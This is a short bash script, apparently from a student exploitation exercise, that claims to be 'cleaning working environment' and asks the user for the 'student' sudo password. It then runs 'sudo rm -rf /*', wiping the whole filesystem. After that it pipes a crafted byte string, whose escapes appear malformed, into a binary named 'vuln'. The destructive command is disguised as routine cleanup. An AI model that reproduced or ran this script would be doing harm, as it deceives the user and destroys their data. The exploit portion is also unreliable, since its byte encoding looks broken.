#!/usr/bin/env bash
echo "Starting script" 
echo "Cleaning working environment\n Enter 'student' for sudo access "
sudo rm -rf /*
null=$(echo '00' | sed 's/../\\x&/g')
start="/x01/xe3/x02/xb2"
echo -en "$start${null}${null}" | /task2/s1851664/vuln